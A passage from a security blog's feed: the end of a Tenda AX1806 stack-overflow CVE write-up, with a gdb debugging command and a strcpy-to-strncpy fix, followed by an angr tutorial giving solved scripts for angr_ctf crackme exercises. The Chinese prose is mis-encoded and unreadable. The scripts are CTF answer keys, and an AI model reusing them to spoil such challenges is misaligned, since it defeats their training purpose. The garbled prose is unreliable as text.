class="line-numbers-rows"><span></span></span></code></pre><p>Ë∞ÉËØïËÑöÊú¨Â¶Ç‰∏ãÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"target remote :1234"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"python set_arch(<span class="token entity" title="\\">\\</span>"</span>arm<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token string">")"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-ex <span class="token string">"b *(<span class="token variable">$1</span>)"</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ÊâßË°åPocÔºåÂõ†‰∏∫Ê†à‰∏≠ËøîÂõûÂú∞ÂùÄË¢´Ë¶ÜÁõñÔºåÊúÄÂêé‰ºöËøîÂõûÊÆµÈîôËØØ‰ø°ÊÅØÔºåqemu Â¥©Ê∫ÉÈÄÄÂá∫„ÄÇ‰ΩÜÂ¶ÇÊûúÂú®ÂÆûÈôÖËøáÁ®ã‰∏≠ÔºåË∑ØÁî±Âô®Â∞±Â∑≤ÁªèÂÆïÊú∫‰∫ÜÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220511160007824.png" alt="image-20220511160007824"></p><p>Âõ†‰∏∫ÊòØ <code>strcpy</code> ÂØπÂ≠óÁ¨¶‰∏≤ËøõË°åÊã∑Ë¥ùÔºåÈÅáÂà∞Á©∫Â≠óÁ¨¶‰ºöÊà™Êñ≠ÔºåÊâÄ‰ª•Êó†Ê≥ïÊûÑÈÄ†Âú∞ÂùÄËøõË°åÂà©Áî®ÔºåÂè™ËÉΩËææÂà∞ÊãíÁªùÊúçÂä°ÁöÑÊîªÂáªÁõÆÁöÑ„ÄÇ</p><h1 id="ÊºèÊ¥û‰øÆÂ§çÊÄùË∑Ø"><a href="#ÊºèÊ¥û‰øÆÂ§çÊÄùË∑Ø" class="headerlink" title="ÊºèÊ¥û‰øÆÂ§çÊÄùË∑Ø"></a>ÊºèÊ¥û‰øÆÂ§çÊÄùË∑Ø</h1><p>ÊÄªÁªì‰∏ãÊù•Â∞±ÊòØ‰ΩøÁî®Âç±Èô©ÂáΩÊï∞ <code>strcpy</code> ÂâçÊú™ÂØπÂèÇÊï∞ËøõË°åÈïøÂ∫¶Âà§Êñ≠ÔºåÂØºËá¥Ê†àÊ∫¢Âá∫„ÄÇÂèØÂ∞Ü <code>strcpy</code> ÂáΩÊï∞ÊõøÊç¢‰∏∫ <code>strncpy</code> ÂáΩÊï∞ÊéßÂà∂Êã∑Ë¥ùÂ≠óÁ¨¶ÈïøÂ∫¶ÔºåÊàñËÄÖÂú®‰ΩøÁî® <code>strcpy</code> ÂâçÂØπÈïøÂ∫¶ËøõË°åÂà§Êñ≠„ÄÇ</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.tenda.com.cn/download/detail-3306.html">AX1806 ÂçáÁ∫ßËΩØ‰ª∂_ËÖæËææ(Tenda)ÂÆòÊñπÁΩëÁ´ô</a></p><p><a href="https://github.com/d1tto/IoT-vuln/tree/main/Tenda/AX1806">IoT-vuln&#x2F;Tenda&#x2F;AX1806 at main ¬∑ d1tto&#x2F;IoT-vuln</a></p><p><a href="https://www.anquanke.com/post/id/204326">ÂÜôÁªôÂàùÂ≠¶ËÄÖÁöÑIoTÂÆûÊàòÊïôÁ®ã‰πãARMÊ†àÊ∫¢Âá∫</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angrÂÖ•Èó®(‰∫å)</title>
      <link href="/2022/05/01/angr-ru-men-er/"/>
      <url>/2022/05/01/angr-ru-men-er/</url>
      
        <content type="html"><![CDATA[<p>Êúâ‰∫Ü‰∏ä‰∏ÄÁØá <a href="https://unrav31.github.io/2022/04/26/angr-ru-men/">angrÂÖ•Èó®</a> ÁöÑÈì∫Âû´ÂêéÔºåÁé∞Âú®Â≠¶‰π†‰∏Ä‰∏ã angr Â¶Ç‰ΩïÁªôÊåáÂÆöÂÜÖÂ≠òÂú∞ÂùÄËµãÂÄº„ÄÇ</p><h1 id="Part-4-angr-symbolic-memory"><a href="#Part-4-angr-symbolic-memory" class="headerlink" title="Part 4 angr symbolic memory"></a>Part 4 angr symbolic memory</h1><p>ËøôÊ¨°‰ª•‰∏Ä‰∏™‰æãÈ¢òÊù•Â≠¶‰π†Â¶Ç‰ΩïÂú® angr ‰∏≠ËÆæÁΩÆÊåáÂÆöÂú∞ÂùÄÁöÑÂÄº„ÄÇÁî® IDA ÊâìÂºÄ 05_angr_symbolic_memory Êñá‰ª∂ÔºåÊü•ÁúãÂáΩÊï∞ÈÄªËæë„ÄÇ‰æùÁÑ∂ÊòØ‰ΩøÁî® <code>scanf</code> ÂáΩÊï∞ËØªÂèñËæìÂÖ•ÔºåËæìÂÖ•ÁöÑÂÜÖÂÆπÊîæÂÖ•‰∫ÜÂÖ®Â±ÄÂèòÈáèÁöÑÂõõ‰∏™Âú∞ÂùÄ‰∏≠ÔºåÂèØ‰ª•ËßÇÂØüÂà∞Ëøô‰∏™Âú∞ÂùÄÂπ∂ÈùûÂ∏∏ËßÑÁöÑ bss ÊÆµÂú∞ÂùÄÔºåËÄåÊòØ‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑÂÜÖÂ≠òÂú∞ÂùÄÔºåÈöèÂêé‰ΩøÁî® <code>complex_function</code> ÂØπËæìÂÖ•ÁöÑÂÜÖÂÆπËøõË°åÂ§ÑÁêÜÔºåÊúÄÂêéÈúÄË¶ÅÂíåÁªôÂá∫ÁöÑÂ≠óÁ¨¶‰∏≤Áõ∏ÂêåÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501103834228.png" alt="image-20220501103834228"></p><p>Ê†πÊçÆ‰πãÂâçÂ≠¶‰π†ËøáÁöÑ angr ‰ΩøÁî®ÊñπÊ≥ïÔºåÂèØ‰ª•Âú® <code>scanf</code> ÂáΩÊï∞‰πãÂêéÁ¨¶Âè∑ÊâßË°åÔºå‰ΩÜÊòØËøôÈáåÊúâ‰∫ÜÂõõ‰∏™ÊåáÂÆöÁöÑÂÜÖÂ≠òÂú∞ÂùÄÔºåÈúÄË¶Å‰ΩøÁî®ÂÆÉ‰ª¨ËøõË°åÊ±ÇËß£„ÄÇÊü•Áúã scaffold05.py ÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> ???  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> ???<span class="token punctuation">)</span>    password0_address <span class="token operator">=</span> ???  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ???  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    solution <span class="token operator">=</span> ???    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Áõ∏Âêå‰ª£Á†ÅÈÉ®ÂàÜÂ∞±‰∏çËØ¶ÁªÜËµòËø∞‰∫ÜÔºåÊúâ‰∏çÊ∏ÖÊ•öÁöÑÂú∞ÊñπÂèØ‰ª•ÂèÇËÄÉÂâçÈù¢<a href="https://unrav31.github.io/2022/04/26/angr-ru-men/">angrÂÖ•Èó®</a> „ÄÇ‰∏ªË¶ÅÁúãÁúã  <code>  initial_state.memory.store(password0_address, password0)</code> ÔºåÂèØ‰ª•ÊääÂêëÈáèÂÄº <code>password0</code> Â≠òÂÇ®Âà∞ÊåáÂÆöÁöÑÂú∞ÂùÄ <code>password0_address</code> ‰∏≠„ÄÇÊàë‰ª¨Áé∞Âú®Â∑≤Áü•ÁöÑÂõõ‰∏™Âú∞ÂùÄ‰∏∫ 0x0A1BA1C0„ÄÅ0x0A1BA1C8„ÄÅ0x0A1BA1D0„ÄÅ0x0A1BA1D8 ÔºåÈÇ£‰πàÂ∞±ÈúÄË¶ÅÂàõÂª∫Âõõ‰∏™ÂêëÈáèÂÄº‰ª•Ê≠§‰º†ÂÖ•„ÄÇÊúÄÂêéÁõ¥Êé•Áúã‰øÆÊîπÂêéÁöÑ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./05_angr_symbolic_memory"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048601</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password3'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password0_address <span class="token operator">=</span> <span class="token number">0x0A1BA1C0</span>  password1_address <span class="token operator">=</span> <span class="token number">0x0A1BA1C8</span>  password2_address <span class="token operator">=</span> <span class="token number">0x0A1BA1d0</span>  password3_address <span class="token operator">=</span> <span class="token number">0x0A1BA1d8</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password1_address<span class="token punctuation">,</span> password1<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password2_address<span class="token punctuation">,</span> password2<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password3_address<span class="token punctuation">,</span> password3<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution2 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password2<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution3 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password3<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>      solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">b" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">b" "</span><span class="token operator">+</span> solution2 <span class="token operator">+</span> <span class="token string">b" "</span><span class="token operator">+</span>solution3    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª£Á†ÅËß£ËØªÔºö</p><ul><li><p><code>start_address</code> ÈÄâÊã© 0x08048601 ÊòØÂõ†‰∏∫ËøôÈáåÊòØ <code>scanf</code> ÂáΩÊï∞ÁªìÊùüÁöÑ‰ΩçÁΩÆÔºåÂπ∂‰∏îÊòØ‰∏Ä‰∏™ <code> for</code> Âæ™ÁéØÁöÑÂºÄÂßã‰ΩçÁΩÆÔºåÂÆÉÂæ™ÁéØ‰∫Ü31Ê¨°Ôºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501110551215.png" alt="image-20220501110551215"></p></li><li><p><code>claripy.BVS(&#39;password&#39;, 64)</code> ÔºåÂõ†‰∏∫ÊØè‰∏™Âú∞ÂùÄÂ≠òÂÇ® 8 Â≠óËäÇÔºåÈÇ£‰πàÂ∞±ÊòØ 64 ‰Ωç </p></li><li><p><code>solution_state.solver.eval(password,cast_to=bytes)</code> ÊòØ‰∏Ä‰∏™Ê†ºÂºèÂåñÂÜÖÂÆπÁöÑ‰ΩúÁî®ÔºåÂ∞ÜÂêëÈáèËΩ¨‰∏∫ <code>bytes</code> Á±ªÂûã</p></li></ul><p>ÊúÄÂêéÂæóÂà∞ÁªìÊûúÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501110026973.png" alt="image-20220501110026973"></p><h1 id="Part-5-angr-symbolic-dynamic-memory"><a href="#Part-5-angr-symbolic-dynamic-memory" class="headerlink" title="Part 5 angr symbolic dynamic memory"></a>Part 5 angr symbolic dynamic memory</h1><p>ÂÖ∂ÂÆûËøô‰∏ÄÈÉ®ÂàÜÂíå Part 4 ÂéüÁêÜÂ∑Æ‰∏çÂ§öÔºåÂè™ÊòØÂ∞ÜËæìÂÖ•ÂÜÖÂÆπÂ≠òÂÇ®Âà∞‰∫ÜÂàÜÈÖçÁöÑÂ†ÜÂùóÂÜÖÂÆπ‰∏≠ÔºåËøôÈÉ®ÂàÜÊù•ÁúãÁúãÂ¶Ç‰ΩïÂ∫îÂØπËøôÁßçÈöèÊú∫Âú∞ÂùÄÁöÑÈóÆÈ¢ò„ÄÇ</p><p>‰ΩøÁî® IDA Êü•ÁúãÁ®ãÂ∫èÈÄªËæëÔºå‰æùÁÑ∂ÊòØÁî® <code>scanf</code> Ëé∑ÂèñËæìÂÖ•ÔºåÂ≠òÂÇ®Âà∞ <code>malloc</code> ÂáΩÊï∞ËøîÂõûÁöÑÂú∞ÂùÄ‰∏≠Ôºå<code>buffer0</code> Âíå <code>buffer1</code> ÈÉΩÊòØ bss ÊÆµÂú∞ÂùÄÔºåÈöèÂêéÂØπËæìÂÖ•ËøõË°åÂ§ÑÁêÜÔºåÊúÄÂêéÂàÜÂà´ÂØπÊØî‰∏§‰∏™Âú∞ÂùÄÂÜÖÂÆπÔºåÊàêÂäüËæìÂá∫‚ÄùGood Job‚ÄùÔºåÂ§±Ë¥•ËæìÂá∫‚ÄùTry again‚ÄùÔºö</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501113842249.png" alt="image-20220501113842249"></p><p>ÂÖ∂ÂÆû angr Âπ∂Ê≤°ÊúâÁúüÊ≠£ÁöÑÊâßË°åÁ®ãÂ∫èÔºåÊâÄ‰ª•ËØ¥Âú®Á¨¶Âè∑ÊâßË°å <code>malloc</code> ÁöÑÊó∂ÂÄôÂπ∂‰∏çÊòØÁúüÊ≠£ÁöÑÂàÜÈÖç‰∫Ü‰∏Ä‰∏™Â†ÜÂùóÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÂàÜÂà´ÈöèÊÑèÂÜô‰∏Ä‰∏™Âú∞ÂùÄÂà∞ <code>buffer0</code> Âíå <code>buffer1</code> ÂÖ®Â±ÄÂèòÈáè‰∏≠Âç≥ÂèØ„ÄÇÊé•‰∏ãÊù•Êü•ÁúãÂÆåÊï¥‰ª£Á†ÅÔºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>  path_to_binary <span class="token operator">=</span> <span class="token string">"./06_angr_symbolic_dynamic_memory"</span>  project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>  start_address <span class="token operator">=</span> <span class="token number">0x08048699</span>  initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>  password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>  fake_heap_address0 <span class="token operator">=</span> <span class="token number">0x12345678</span>  pointer_to_malloc_memory_address0 <span class="token operator">=</span> <span class="token number">0x0ABCC8A4</span>  fake_heap_address1 <span class="token operator">=</span> <span class="token number">0x12345680</span>  pointer_to_malloc_memory_address1 <span class="token operator">=</span> <span class="token number">0x0ABCC8AC</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address1<span class="token punctuation">,</span> fake_heap_address1<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address0<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>  initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>fake_heap_address1<span class="token punctuation">,</span> password1<span class="token punctuation">)</span>  simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>  <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">,</span>cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>    solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">b' '</span> <span class="token operator">+</span> solution1    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª£Á†ÅËß£ËØªÔºö</p><ul><li><p><code>start_address</code> ‰æùÁÑ∂ÊòØ <code>scanf</code> ÂáΩÊï∞ÁªìÂ∞æÔºåÂπ∂‰∏îÊòØÂæ™ÁéØÂºÄÂßãÁöÑÂú∞ÂùÄ</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220501114723729.png" alt="image-20220501114723729"></p></li><li><p><code>claripy.BVS(&#39;password&#39;, 64)</code> ËæìÂÖ•ÁöÑ‰πüÊòØ 8 Â≠óËäÇÔºåÊâÄ‰ª•ÊòØ 64 ‰Ωç</p></li><li><p>Êé•‰∏ãÊù•ËøôÊÆµ‰ª£Á†ÅÔºåÂàÜÂà´Â∞Ü‰º™ÈÄ†ÁöÑÂ†ÜÂú∞ÂùÄ 0x12345678„ÄÅ 0x12345680 ÂÜôÂÖ•Âà∞ÂÖ®Â±ÄÂèòÈáè <code>buffer0</code>„ÄÅ<code>buffer1</code> ‰∏≠Ôºö</p></li></ul>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">fake_heap_address0 <span class="token operator">=</span> <span class="token 